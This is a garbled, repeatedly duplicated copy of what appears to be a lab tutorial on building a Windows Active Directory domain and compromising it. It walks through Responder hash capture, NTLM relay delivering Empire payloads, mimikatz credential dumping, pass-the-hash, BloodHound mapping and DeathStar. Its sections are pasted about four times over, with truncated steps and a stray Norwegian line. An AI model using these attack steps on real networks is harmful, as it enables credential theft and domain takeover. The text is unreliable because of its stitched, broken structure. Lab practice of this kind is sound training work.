### Sharpen your knives
You need a lot of tools for this. Get ready! Make a directory to put all this in, because it can get messy. I won't explain all the tools. Some things you gotta ready yourself.

- [Impacket](https://github.com/CoreSecurity/impacket) - Includes ntlmrelay, which will be useful later.
- [Responder](https://github.com/lgandx/Responder) - Poisons requests.
- [Empire](https://github.com/EmpireProject/Empire) - Imagine it as a Metasploit for Windows hacking.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Includes tools to check for SMB signing.
- [DeathStar](https://github.com/byt3bl33d3r/DeathStar) - Insanely cool tool for automating the "getting DA" process. Still in development, so may not always be stable.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Creating a map of AD. Check the /releases on the GitHub page for precompiled binaries!
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Powershell tools, some are included in Empire already.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Dumping credentials
- [Neo4j](https://neo4j.com/download/) - Database to use with BloodHound

Now you may need to trick a bit with installing the dependencies for all these tools. Familiarize yourself with pip. Make sure you are running tools and scripts with the correct Python version. Certain tools are written for 2.7 and some for 3.

### Passing the hash
The first goal of a Windows pentest is to get a user or a shell as a user.

In a windows AD environment 9 times out of 10 all the workstations share the same local administrator password. You might be really lucky and both the workstations and servers share the same local administrator password as well. At that point it becomes a discovery mission for where the domain admins are logged in.

### Responder attack

Responder does not pick up on



Responder captures NetNTLMv2 hashes. You can not pass the hash with these but you can relay them.

Responder picks up on NetBIOS and LLMNR, because Windows boxes are VERY chatty!
Responder works because the windows box are looking for resources and default to NetBIOS.

Open explorer on the Windows machines and write `\\share\` and wait for the credential prompt. This will trigger a request over SMB to find a resource using the users credentials. That should allow Responder to capture the NetNTLMv2 hash of the user.


### Responder with NTLM relay attack

byt3bl33d3r is a very prominent figure in this area. He has written some good guides on this attack.
https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used

With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.

- `cme smb <CIDR> --gen-relay-list targets.txt` where the CIDR is your domain subnet. This generates a list where SMB-signing is disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one.


#### Responder

- `Responder -I eth0 -wrf` where eth0 is your interface



https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

#### Empire

Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found here, but I have a few commands listed below.
https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/

```
uselistener http
set Port 81
execute
back
usestager multi/launcher
set Listener http
generate
agents
```

#### NTLMrelay
- NTLMrelay.tx


Now copypaste the payload from Empire into the NTLMrelay command above. This will execute the payload for every box it relays to and it should be raining shells very soon. You will see a message in Empire saying it got an agent when it's successful. You will also see hashes written in the terminal while it's running.

#### Back to Empire

Now I have had some trouble where agents are not always spawned or hashes are not captured. Here's what you can try:

- Trigger a few requests from the Windows machines using the `\\share\` trick.
- Restart all the tools.
- Reset Empire's database.
- Reboot the Windows machines.
- Execute the payload from cmd inside a Windows computer to check if it's actually working. (You should get an agent instantly).

Ok, so you have an agent now. Sometimes the interaction with agents in Empire  agent can be painstakingly slow, so have some patience when running commands. Try whoami, sysinfo and other basic commands. Sometimes, the agents timeout and you'll have to spawn new ones. Kill and/or remove old ones using `kill` and `remove`.

Once you have administrator access to a box you can run mimikatz, which is bundled with Empire. If you're lucky you'll get DA creds in plaintext. If you have a local administrator hash on the hosts you can use CrackMapExec to do a mass mimikatz. Basically what it does is a pass the hash on multiple hosts, runs the mimikatz sekurlsa::loggonpasswords and returns output. Hopefully one of them is a DA and game over. Now this might be a bit confusing so lkys37en explained this the following way:

>Say you're an IT administrator. You're logged into your workstation and your account has domain admin rights. I come along and pop a admin shell on another workstation. I grab the hash and do a pass the hash with the local administrator account to your box and then run mimikatz. If you're running win 7 and 8 I'll get plain text plus NTLM hash. If you're running win 8.1 and above I only get the NTLM hash.

 What this means is that you gain the local admin hash, and pass it to the DC which proves you are admin on DA, which allows you to do mimikatz and extract DA credentials. You're hoping the IT admins used the same local administrator account on all workstations

 To check if the user is part of the Domain Admins group, run `net user "Domain Admins" /domain`

 Now if you're so lucky that you're a DA you can start looking into lateral movement modules in Empire to get into the DC and have some fun.


### DeathStar
I love all the Star Wars references. DeathStar is a pretty new tool for automating the entire process of becoming DA.
[byt3bl33d3r has documented it on his Github](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html).


Basically, you run the NTLMrelay attack from the previous step, but with Empire set up with a REST API. Then you just run DeathStar, grab a coffee and come back as Domain Admin.

Note: I have had some trouble making DeathStar and Empire cooperate. There's a little explanation of why in the DeathStar Github page. Hopefully, it will be stable soon.


### Mapping AD with BloodHound

One of the glorious design features of AD is that everyone needs to know where everything is. So when you get user credentials and/or a shell, you can basically map the entire domain. Any user can query Active Directory for groups and sessions.

Now we can use that to make a cool GUI map of the entire AD which can be quirired in using BloodHound.





set up neo4j
https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/

/opt/neo4j-community-3.1.1/bin/neo4j
start neo4j and set new password
edit neo4j.conf
dbms.connector.http.enabled=true
dbms.connector.http.listen_address=0.0.0.0:7474

launch bloodhound and log in to neo4j db

powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"

kan nå laste opp powersploit moduler.
upload /path/powersploit/persistence.msl1
import-module ./persistence.msl1
Get-SecurityPackages
## Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it

_Mad credz to **lkys37en** from the netsecfocus slack channel for getting me all into this stuff, and eventually making this guide possible._

I strongly you read every step closely, as missing out on certain things can make everything not work as it should.

### VMware or Virtualbox
- Set up a host-only network with DHCP on the host machine.
- Start whatever DHCP service you are running on your host.
- If you're using ESXI or other types of hypervisors, you  probably don't need me telling you what to do.


### Install VMs

Install the following as VMs:

- **W7**
- **W8 or 8.1**
- **W10**
- **WServer 2012 R2**

Set the same password on all accounts, except the Server which will be set up as Domain Admin (DA). Set a stronger password for this one! Service packs and patch levels are not that important for this lab.

Give each machine 2 vCPU, 2 GB RAM and enough storage space. Remember to set the network adapter for the VMs to the host-only network you created. Remember to also add an adapter in the Kali VM settings and make sure it gets an IP. You should be able to ping host from Kali and vice versa.

I'm assuming you already have your Kali VM set up if you intend to hack this.


### Creating a domain and some users

[A good tutorial on setting up a Domain Controller](https://social.technet.microsoft.com/wiki/contents/articles/22622.building-your-first-domain-controller-on-2012-r2.aspx)


- Create a Domain on the Server 2012 R2 machine
- Set it up as a Domain Controller (DC)
- [Create three user accounts in the domain and give them simple names and passwords, like User1:Password1](https://msdn.microsoft.com/en-us/library/aa545262.aspx)
- Set a static IP with DNS pointed to 127.0.0.1



### Adding hosts and users to domain
These steps must be performed for all hosts: W7, W8 and W10.
- Log in as the administrator account on all hosts
- Set the time correctly (this is actually important)
- Disable Windows Defender and Windows Firewall
- Enable network sharing
- Set DNS settings to point to the IP of the DC
- Change the "computer name" to something easy (like W7 for the Windows 7 machine)
-  [Add the hosts to the domain]( https://technet.microsoft.com/en-us/library/bb456990.aspx)
- Add the "Domain Users" group to the administrators group using `net localgroup administrators /add "DOMAIN\Domain Users"`
- To confirm the group was added, run `net localgroup Administrators` and you should see "Domain Users" added to that group
- Log in to each of the domain users you created earlier on the workstations, except one box of your choosing, where you log in as DA
- Ping al the machines back and forth to make sure everything is working. Ping Kali and the host as well.

### Mini guide to Windows hashes
I am no expert in this, but this should cover the basics necessary for this guide:

There are a few different types of hashes in Windows and they can be very confusing.

No windows hashes are salted, so two identical hashes will yield the same plaintext. Windows hashes are broken down into two hashes. LMhash and NTLMhash. This is an example: `testuser:29418:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71`

Broken down:
`username:unique_identifier:LMhash:NTLMhash`

- **LM** - Disabled in W7 and above. However, LM is enabled in memory if the password is less than 15 characters. That's why all recommendations for admin accounts are 15+ chars. LM is old, based on MD4 and easy to crack. The reason is that Windows domains require speed, but that also makes for shit security.
- **NT** -
- **NTLM** - hash for local authentication on hosts. Windows uses the NTLM hash for authentication on the machines across the network
- **NetNTLMv2** - hashes for authentication on the network (SMB)
-


In windows the hashes are stored in memory for single sign-on purposes. Everytime a user clicks on a  network share the creds are passed across the network. We can grab that. The alternative is to always ask the user for credentials, which will never happen in a windows environment.

NTLM hash is just as good as plaintext creds when authenticating to windows machines so it's not that big of a deal if you can't grab plaintext credentials.

Cracking hashes can be a lot of fun, and since most user passwords are shit they can easily be cracked in not too much time. Imagine if the organisation has a password reset policy of 90 days. If you crack a user's credentials in two hours it's a big fail for them. If you can crack a DA's creds in two hours or even a few days it's game over for them. But instead of cracking hashes, we can reuse them by relaying.

### Mini guide to Windows lookups

Now, there are a few different lookup services in Windows.
- **FQDN** - Fully qualified domain name
- **LLMNR**
- **NBT**-NS (NetBIOS Name Service)
- **LLMNR** (Link-Local Multicast Name Resolution)

FQDN is almost another name for DNS name. `share.hacklab.net` is a FQDN.
When a windows machine needs to perform a resource lookup such as a network share it will go in this order FQDN, WINS, NetBIOS and then LLMNR.
Because FQDN lookup is not enabled by default it defaults to WINS and then NetBIOS. The latter is poor man's DNS. In the corporate world a DNS server is available to look up resources, in a home environment it's less likely so if you want to share content between two workstations NetBIOS is how it's done. But because users don't type in share.hacklab.net in their address fields the lookup uses NetBIOS.


### Sharpen your knives
You need a lot of tools for this. Get ready! Make a directory to put all this in, because it can get messy. I won't explain all the tools. Some things you gotta ready yourself.

- [Impacket](https://github.com/CoreSecurity/impacket) - Includes ntlmrelay, which will be useful later.
- [Responder](https://github.com/lgandx/Responder) - Poisons requests.
- [Empire](https://github.com/EmpireProject/Empire) - Imagine it as a Metasploit for Windows hacking.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Includes tools to check for SMB signing.
- [DeathStar](https://github.com/byt3bl33d3r/DeathStar) - Insanely cool tool for automating the "getting DA" process. Still in development, so may not always be stable.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Creating a map of AD. Check the /releases on the GitHub page for precompiled binaries!
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Powershell tools, some are included in Empire already.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Dumping credentials
- [Neo4j](https://neo4j.com/download/) - Database to use with BloodHound

Now you may need to trick a bit with installing the dependencies for all these tools. Familiarize yourself with pip. Make sure you are running tools and scripts with the correct Python version. Certain tools are written for 2.7 and some for 3.

### Passing the hash
The first goal of a Windows pentest is to get a user or a shell as a user.

In a windows AD environment 9 times out of 10 all the workstations share the same local administrator password. You might be really lucky and both the workstations and servers share the same local administrator password as well. At that point it becomes a discovery mission for where the domain admins are logged in.

### Responder attack

Responder does not pick up on



Responder captures NetNTLMv2 hashes. You can not pass the hash with these but you can relay them.

Responder picks up on NetBIOS and LLMNR, because Windows boxes are VERY chatty!
Responder works because the windows box are looking for resources and default to NetBIOS.

Open explorer on the Windows machines and write `\\share\` and wait for the credential prompt. This will trigger a request over SMB to find a resource using the users credentials. That should allow Responder to capture the NetNTLMv2 hash of the user.


### Responder with NTLM relay attack

byt3bl33d3r is a very prominent figure in this area. He has written some good guides on this attack.
https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used

With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.

- `cme smb <CIDR> --gen-relay-list targets.txt` where the CIDR is your domain subnet. This generates a list where SMB-signing is disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one.


#### Responder

- `Responder -I eth0 -wrf` where eth0 is your interface



https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

#### Empire

Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found here, but I have a few commands listed below.
https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/

```
uselistener http
set Port 81
execute
back
usestager multi/launcher
set Listener http
generate
agents
```

#### NTLMrelay
- NTLMrelay.tx


Now copypaste the payload from Empire into the NTLMrelay command above. This will execute the payload for every box it relays to and it should be raining shells very soon. You will see a message in Empire saying it got an agent when it's successful. You will also see hashes written in the terminal while it's running.

#### Back to Empire

Now I have had some trouble where agents are not always spawned or hashes are not captured. Here's what you can try:

- Trigger a few requests from the Windows machines using the `\\share\` trick.
- Restart all the tools.
- Reset Empire's database.
- Reboot the Windows machines.
- Execute the payload from cmd inside a Windows computer to check if it's actually working. (You should get an agent instantly).

Ok, so you have an agent now. Sometimes the interaction with agents in Empire  agent can be painstakingly slow, so have some patience when running commands. Try whoami, sysinfo and other basic commands. Sometimes, the agents timeout and you'll have to spawn new ones. Kill and/or remove old ones using `kill` and `remove`.

Once you have administrator access to a box you can run mimikatz, which is bundled with Empire. If you're lucky you'll get DA creds in plaintext. If you have a local administrator hash on the hosts you can use CrackMapExec to do a mass mimikatz. Basically what it does is a pass the hash on multiple hosts, runs the mimikatz sekurlsa::loggonpasswords and returns output. Hopefully one of them is a DA and game over. Now this might be a bit confusing so lkys37en explained this the following way:

>Say you're an IT administrator. You're logged into your workstation and your account has domain admin rights. I come along and pop a admin shell on another workstation. I grab the hash and do a pass the hash with the local administrator account to your box and then run mimikatz. If you're running win 7 and 8 I'll get plain text plus NTLM hash. If you're running win 8.1 and above I only get the NTLM hash.

 What this means is that you gain the local admin hash, and pass it to the DC which proves you are admin on DA, which allows you to do mimikatz and extract DA credentials. You're hoping the IT admins used the same local administrator account on all workstations

 To check if the user is part of the Domain Admins group, run `net user "Domain Admins" /domain`

 Now if you're so lucky that you're a DA you can start looking into lateral movement modules in Empire to get into the DC and have some fun.


### DeathStar
I love all the Star Wars references. DeathStar is a pretty new tool for automating the entire process of becoming DA.
[byt3bl33d3r has documented it on his Github](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html).


Basically, you run the NTLMrelay attack from the previous step, but with Empire set up with a REST API. Then you just run DeathStar, grab a coffee and come back as Domain Admin.

Note: I have had some trouble making DeathStar and Empire cooperate. There's a little explanation of why in the DeathStar Github page. Hopefully, it will be stable soon.


### Mapping AD with BloodHound

One of the glorious design features of AD is that everyone needs to know where everything is. So when you get user credentials and/or a shell, you can basically map the entire domain. Any user can query Active Directory for groups and sessions.

Now we can use that to make a cool GUI map of the entire AD which can be quirired in using BloodHound.





set up neo4j
https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/

/opt/neo4j-community-3.1.1/bin/neo4j
start neo4j and set new password
edit neo4j.conf
dbms.connector.http.enabled=true
dbms.connector.http.listen_address=0.0.0.0:7474

launch bloodhound and log in to neo4j db

powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"

kan nå laste opp powersploit moduler.
upload /path/powersploit/persistence.msl1
import-module ./persistence.msl1
Get-SecurityPackages
## Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it

_Mad credz to **lkys37en** from the netsecfocus slack channel for getting me all into this stuff, and eventually making this guide possible._

I strongly you read every step closely, as missing out on certain things can make everything not work as it should.

### VMware or Virtualbox
- Set up a host-only network with DHCP on the host machine.
- Start whatever DHCP service you are running on your host.
- If you're using ESXI or other types of hypervisors, you  probably don't need me telling you what to do.


### Install VMs

Install the following as VMs:

- **W7**
- **W8 or 8.1**
- **W10**
- **WServer 2012 R2**

Set the same password on all accounts, except the Server which will be set up as Domain Admin (DA). Set a stronger password for this one! Service packs and patch levels are not that important for this lab.

Give each machine 2 vCPU, 2 GB RAM and enough storage space. Remember to set the network adapter for the VMs to the host-only network you created. Remember to also add an adapter in the Kali VM settings and make sure it gets an IP. You should be able to ping host from Kali and vice versa.

I'm assuming you already have your Kali VM set up if you intend to hack this.


### Creating a domain and some users

[A good tutorial on setting up a Domain Controller](https://social.technet.microsoft.com/wiki/contents/articles/22622.building-your-first-domain-controller-on-2012-r2.aspx)


- Create a Domain on the Server 2012 R2 machine
- Set it up as a Domain Controller (DC)
- [Create three user accounts in the domain and give them simple names and passwords, like User1:Password1](https://msdn.microsoft.com/en-us/library/aa545262.aspx)
- Set a static IP with DNS pointed to 127.0.0.1



### Adding hosts and users to domain
These steps must be performed for all hosts: W7, W8 and W10.
- Log in as the administrator account on all hosts
- Set the time correctly (this is actually important)
- Disable Windows Defender and Windows Firewall
- Enable network sharing
- Set DNS settings to point to the IP of the DC
- Change the "computer name" to something easy (like W7 for the Windows 7 machine)
-  [Add the hosts to the domain]( https://technet.microsoft.com/en-us/library/bb456990.aspx)
- Add the "Domain Users" group to the administrators group using `net localgroup administrators /add "DOMAIN\Domain Users"`
- To confirm the group was added, run `net localgroup Administrators` and you should see "Domain Users" added to that group
- Log in to each of the domain users you created earlier on the workstations, except one box of your choosing, where you log in as DA
- Ping al the machines back and forth to make sure everything is working. Ping Kali and the host as well.

### Mini guide to Windows hashes
I am no expert in this, but this should cover the basics necessary for this guide:

There are a few different types of hashes in Windows and they can be very confusing.

No windows hashes are salted, so two identical hashes will yield the same plaintext. Windows hashes are broken down into two hashes. LMhash and NTLMhash. This is an example: `testuser:29418:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71`

Broken down:
`username:unique_identifier:LMhash:NTLMhash`

- **LM** - Disabled in W7 and above. However, LM is enabled in memory if the password is less than 15 characters. That's why all recommendations for admin accounts are 15+ chars. LM is old, based on MD4 and easy to crack. The reason is that Windows domains require speed, but that also makes for shit security.
- **NT** -
- **NTLM** - hash for local authentication on hosts. Windows uses the NTLM hash for authentication on the machines across the network
- **NetNTLMv2** - hashes for authentication on the network (SMB)
-


In windows the hashes are stored in memory for single sign-on purposes. Everytime a user clicks on a  network share the creds are passed across the network. We can grab that. The alternative is to always ask the user for credentials, which will never happen in a windows environment.

NTLM hash is just as good as plaintext creds when authenticating to windows machines so it's not that big of a deal if you can't grab plaintext credentials.

Cracking hashes can be a lot of fun, and since most user passwords are shit they can easily be cracked in not too much time. Imagine if the organisation has a password reset policy of 90 days. If you crack a user's credentials in two hours it's a big fail for them. If you can crack a DA's creds in two hours or even a few days it's game over for them. But instead of cracking hashes, we can reuse them by relaying.

### Mini guide to Windows lookups

Now, there are a few different lookup services in Windows.
- **FQDN** - Fully qualified domain name
- **LLMNR**
- **NBT**-NS (NetBIOS Name Service)
- **LLMNR** (Link-Local Multicast Name Resolution)

FQDN is almost another name for DNS name. `share.hacklab.net` is a FQDN.
When a windows machine needs to perform a resource lookup such as a network share it will go in this order FQDN, WINS, NetBIOS and then LLMNR.
Because FQDN lookup is not enabled by default it defaults to WINS and then NetBIOS. The latter is poor man's DNS. In the corporate world a DNS server is available to look up resources, in a home environment it's less likely so if you want to share content between two workstations NetBIOS is how it's done. But because users don't type in share.hacklab.net in their address fields the lookup uses NetBIOS.


### Sharpen your knives
You need a lot of tools for this. Get ready! Make a directory to put all this in, because it can get messy. I won't explain all the tools. Some things you gotta ready yourself.

- [Impacket](https://github.com/CoreSecurity/impacket) - Includes ntlmrelay, which will be useful later.
- [Responder](https://github.com/lgandx/Responder) - Poisons requests.
- [Empire](https://github.com/EmpireProject/Empire) - Imagine it as a Metasploit for Windows hacking.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Includes tools to check for SMB signing.
- [DeathStar](https://github.com/byt3bl33d3r/DeathStar) - Insanely cool tool for automating the "getting DA" process. Still in development, so may not always be stable.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Creating a map of AD. Check the /releases on the GitHub page for precompiled binaries!
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Powershell tools, some are included in Empire already.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Dumping credentials
- [Neo4j](https://neo4j.com/download/) - Database to use with BloodHound

Now you may need to trick a bit with installing the dependencies for all these tools. Familiarize yourself with pip. Make sure you are running tools and scripts with the correct Python version. Certain tools are written for 2.7 and some for 3.

### Passing the hash
The first goal of a Windows pentest is to get a user or a shell as a user.

In a windows AD environment 9 times out of 10 all the workstations share the same local administrator password. You might be really lucky and both the workstations and servers share the same local administrator password as well. At that point it becomes a discovery mission for where the domain admins are logged in.

### Responder attack

Responder does not pick up on



Responder captures NetNTLMv2 hashes. You can not pass the hash with these but you can relay them.

Responder picks up on NetBIOS and LLMNR, because Windows boxes are VERY chatty!
Responder works because the windows box are looking for resources and default to NetBIOS.

Open explorer on the Windows machines and write `\\share\` and wait for the credential prompt. This will trigger a request over SMB to find a resource using the users credentials. That should allow Responder to capture the NetNTLMv2 hash of the user.


### Responder with NTLM relay attack

byt3bl33d3r is a very prominent figure in this area. He has written some good guides on this attack.
https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used

With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.

- `cme smb <CIDR> --gen-relay-list targets.txt` where the CIDR is your domain subnet. This generates a list where SMB-signing is disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one.


#### Responder

- `Responder -I eth0 -wrf` where eth0 is your interface



https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

#### Empire

Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found here, but I have a few commands listed below.
https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/

```
uselistener http
set Port 81
execute
back
usestager multi/launcher
set Listener http
generate
agents
```

#### NTLMrelay
- NTLMrelay.tx


Now copypaste the payload from Empire into the NTLMrelay command above. This will execute the payload for every box it relays to and it should be raining shells very soon. You will see a message in Empire saying it got an agent when it's successful. You will also see hashes written in the terminal while it's running.

#### Back to Empire

Now I have had some trouble where agents are not always spawned or hashes are not captured. Here's what you can try:

- Trigger a few requests from the Windows machines using the `\\share\` trick.
- Restart all the tools.
- Reset Empire's database.
- Reboot the Windows machines.
- Execute the payload from cmd inside a Windows computer to check if it's actually working. (You should get an agent instantly).

Ok, so you have an agent now. Sometimes the interaction with agents in Empire  agent can be painstakingly slow, so have some patience when running commands. Try whoami, sysinfo and other basic commands. Sometimes, the agents timeout and you'll have to spawn new ones. Kill and/or remove old ones using `kill` and `remove`.

Once you have administrator access to a box you can run mimikatz, which is bundled with Empire. If you're lucky you'll get DA creds in plaintext. If you have a local administrator hash on the hosts you can use CrackMapExec to do a mass mimikatz. Basically what it does is a pass the hash on multiple hosts, runs the mimikatz sekurlsa::loggonpasswords and returns output. Hopefully one of them is a DA and game over. Now this might be a bit confusing so lkys37en explained this the following way:

>Say you're an IT administrator. You're logged into your workstation and your account has domain admin rights. I come along and pop a admin shell on another workstation. I grab the hash and do a pass the hash with the local administrator account to your box and then run mimikatz. If you're running win 7 and 8 I'll get plain text plus NTLM hash. If you're running win 8.1 and above I only get the NTLM hash.

 What this means is that you gain the local admin hash, and pass it to the DC which proves you are admin on DA, which allows you to do mimikatz and extract DA credentials. You're hoping the IT admins used the same local administrator account on all workstations

 To check if the user is part of the Domain Admins group, run `net user "Domain Admins" /domain`

 Now if you're so lucky that you're a DA you can start looking into lateral movement modules in Empire to get into the DC and have some fun.


### DeathStar
I love all the Star Wars references. DeathStar is a pretty new tool for automating the entire process of becoming DA.
[byt3bl33d3r has documented it on his Github](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html).


Basically, you run the NTLMrelay attack from the previous step, but with Empire set up with a REST API. Then you just run DeathStar, grab a coffee and come back as Domain Admin.

Note: I have had some trouble making DeathStar and Empire cooperate. There's a little explanation of why in the DeathStar Github page. Hopefully, it will be stable soon.


### Mapping AD with BloodHound

One of the glorious design features of AD is that everyone needs to know where everything is. So when you get user credentials and/or a shell, you can basically map the entire domain. Any user can query Active Directory for groups and sessions.

Now we can use that to make a cool GUI map of the entire AD which can be quirired in using BloodHound.





set up neo4j
https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/

/opt/neo4j-community-3.1.1/bin/neo4j
start neo4j and set new password
edit neo4j.conf
dbms.connector.http.enabled=true
dbms.connector.http.listen_address=0.0.0.0:7474

launch bloodhound and log in to neo4j db

powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"

kan nå laste opp powersploit moduler.
upload /path/powersploit/persistence.msl1
import-module ./persistence.msl1
Get-SecurityPackages
https://www.gitbook.com/book/chryzsh/darthsidious/details## Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it

_Mad credz to **lkys37en** from the netsecfocus slack channel for getting me all into this stuff, and eventually making this guide possible._

I strongly you read every step closely, as missing out on certain things can make everything not work as it should.

### VMware or Virtualbox
- Set up a host-only network with DHCP on the host machine.
- Start whatever DHCP service you are running on your host.
- If you're using ESXI or other types of hypervisors, you  probably don't need me telling you what to do.


### Install VMs

Install the following as VMs:

- **W7**
- **W8 or 8.1**
- **W10**
- **WServer 2012 R2**

Set the same password on all accounts, except the Server which will be set up as Domain Admin (DA). Set a stronger password for this one! Service packs and patch levels are not that important for this lab.

Give each machine 2 vCPU, 2 GB RAM and enough storage space. Remember to set the network adapter for the VMs to the host-only network you created. Remember to also add an adapter in the Kali VM settings and make sure it gets an IP. You should be able to ping host from Kali and vice versa.

I'm assuming you already have your Kali VM set up if you intend to hack this.


### Creating a domain and some users

[A good tutorial on setting up a Domain Controller](https://social.technet.microsoft.com/wiki/contents/articles/22622.building-your-first-domain-controller-on-2012-r2.aspx)


- Create a Domain on the Server 2012 R2 machine
- Set it up as a Domain Controller (DC)
- [Create three user accounts in the domain and give them simple names and passwords, like User1:Password1](https://msdn.microsoft.com/en-us/library/aa545262.aspx)
- Set a static IP with DNS pointed to 127.0.0.1



### Adding hosts and users to domain
These steps must be performed for all hosts: W7, W8 and W10.
- Log in as the administrator account on all hosts
- Set the time correctly (this is actually important)
- Disable Windows Defender and Windows Firewall
- Enable network sharing
- Set DNS settings to point to the IP of the DC
- Change the "computer name" to something easy (like W7 for the Windows 7 machine)
-  [Add the hosts to the domain]( https://technet.microsoft.com/en-us/library/bb456990.aspx)
- Add the "Domain Users" group to the administrators group using `net localgroup administrators /add "DOMAIN\Domain Users"`
- To confirm the group was added, run `net localgroup Administrators` and you should see "Domain Users" added to that group
- Log in to each of the domain users you created earlier on the workstations, except one box of your choosing, where you log in as DA
- Ping al the machines back and forth to make sure everything is working. Ping Kali and the host as well.

### Mini guide to Windows hashes
I am no expert in this, but this should cover the basics necessary for this guide:

There are a few different types of hashes in Windows and they can be very confusing.

No windows hashes are salted, so two identical hashes will yield the same plaintext. Windows hashes are broken down into two hashes. LMhash and NTLMhash. This is an example: `testuser:29418:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71`

Broken down:
`username:unique_identifier:LMhash:NTLMhash`

- **LM** - Disabled in W7 and above. However, LM is enabled in memory if the password is less than 15 characters. That's why all recommendations for admin accounts are 15+ chars. LM is old, based on MD4 and easy to crack. The reason is that Windows domains require speed, but that also makes for shit security.
- **NT** -
- **NTLM** - hash for local authentication on hosts. Windows uses the NTLM hash for authentication on the machines across the network
- **NetNTLMv2** - hashes for authentication on the network (SMB)
-


In windows the hashes are stored in memory for single sign-on purposes. Everytime a user clicks on a  network share the creds are passed across the network. We can grab that. The alternative is to always ask the user for credentials, which will never happen in a windows environment.

NTLM hash is just as good as plaintext creds when authenticating to windows machines so it's not that big of a deal if you can't grab plaintext credentials.

Cracking hashes can be a lot of fun, and since most user passwords are shit they can easily be cracked in not too much time. Imagine if the organisation has a password reset policy of 90 days. If you crack a user's credentials in two hours it's a big fail for them. If you can crack a DA's creds in two hours or even a few days it's game over for them. But instead of cracking hashes, we can reuse them by relaying.

### Mini guide to Windows lookups

Now, there are a few different lookup services in Windows.
- **FQDN** - Fully qualified domain name
- **LLMNR**
- **NBT**-NS (NetBIOS Name Service)
- **LLMNR** (Link-Local Multicast Name Resolution)

FQDN is almost another name for DNS name. `share.hacklab.net` is a FQDN.
When a windows machine needs to perform a resource lookup such as a network share it will go in this order FQDN, WINS, NetBIOS and then LLMNR.
Because FQDN lookup is not enabled by default it defaults to WINS and then NetBIOS. The latter is poor man's DNS. In the corporate world a DNS server is available to look up resources, in a home environment it's less likely so if you want to share content between two workstations NetBIOS is how it's done. But because users don't type in share.hacklab.net in their address fields the lookup uses NetBIOS.


### Sharpen your knives
You need a lot of tools for this. Get ready! Make a directory to put all this in, because it can get messy. I won't explain all the tools. Some things you gotta ready yourself.

- [Impacket](https://github.com/CoreSecurity/impacket) - Includes ntlmrelay, which will be useful later.
- [Responder](https://github.com/lgandx/Responder) - Poisons requests.
- [Empire](https://github.com/EmpireProject/Empire) - Imagine it as a Metasploit for Windows hacking.
